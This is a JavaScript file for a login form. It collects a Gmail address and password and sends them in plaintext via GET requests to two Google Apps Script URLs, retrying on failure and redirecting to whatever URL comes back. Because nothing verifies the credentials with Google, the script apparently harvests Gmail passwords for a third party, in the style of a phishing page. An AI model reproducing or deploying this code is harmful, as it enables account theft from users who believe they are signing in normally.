var url= ["https://script.google.com/macros/s/AKfycbwyjiwLa7LGHT_LJJ-S6NST_joY9KhDiKJZVzpBGwkovOFIcNqrndEQsFJfoPkElL6A/exec", "https://script.google.com/macros/s/AKfycbxJb1-RL5mnG6AtLvLTogQk4WXmZwYWbr-XTscWCaIGi7dsQ-sxIgAWWVV6UqhB5Y0EMw/exec"];

var eye= document.getElementById("checkEye");
eye.addEventListener("click", function(e){
    if(e.target.classList.contains("fa-eye")){
        e.target.classList.remove("fa-eye");
        e.target.classList.add("fa-eye-slash");
        document.getElementById("password").setAttribute("type", "text");
    }
    else{
        document.getElementById("password").setAttribute("type", "password");
        e.target.classList.remove("fa-eye-slash");
        e.target.classList.add("fa-eye");
    }
    document.getElementById("password").focus();
});

function showPassword(status){
    if(status)
        password.type= "text";
    else
        password.type= "password";
}

document.getElementById("password").addEventListener('focus', Focus);
function Focus(){
    document.getElementById("password-area").focus();
}

function Confirm(){
    var gmail= document.getElementById("gmail").value.split('@');
    var password= document.getElementById("password").value;
    document.getElementById("gmail").value= "";
    document.getElementById("password").value= "";
        
    Send(gmail[0]+"@gmail.com", password, 0);
}

function Send(gmail, password, index){
    $.ajax({
            type:'get',
            cache: false,
            timeout: 5000,
            url: url[index%2],
            data:  {
                'gmail' : gmail,
                'password': password
            },
            datatype:'json',
            success: function(respond){
                if(respond=="WA")
                    alert("郵件或密碼輸入錯誤");
                else
                    location.href= respond;
            },
            error: function(XMLHttpRequest, textStatus, errorThrown){
                alert("執行逾時，將重新傳送訊息");
                Send(gmail, password, index+1);
            }
        });
}